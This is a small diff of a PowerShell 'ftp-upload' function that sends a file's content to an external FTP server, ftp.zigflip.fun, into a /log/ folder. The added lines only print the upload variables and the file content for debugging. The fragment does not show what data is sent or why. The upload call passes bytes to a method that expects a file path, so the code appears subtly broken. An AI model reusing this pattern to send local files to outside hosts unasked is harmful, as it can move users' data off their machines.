@@ -18,6 +18,9 @@ function ftp-upload {
         $webClient.UploadFile("ftp://ftp.zigflip.fun/log/" + $outputFile, [System.Text.Encoding]::UTF8.GetBytes($fileContent))
 
         Write-Host "Le fichier a été uploadé avec succès."
+	Write-Host "fileupload : $fileupload"
+        Write-Host "outpufile  : $outputFile"
+	Write-Host "filecontent  : $fileContent"
     }
     catch {
         Write-Host "fileupload : $fileupload"
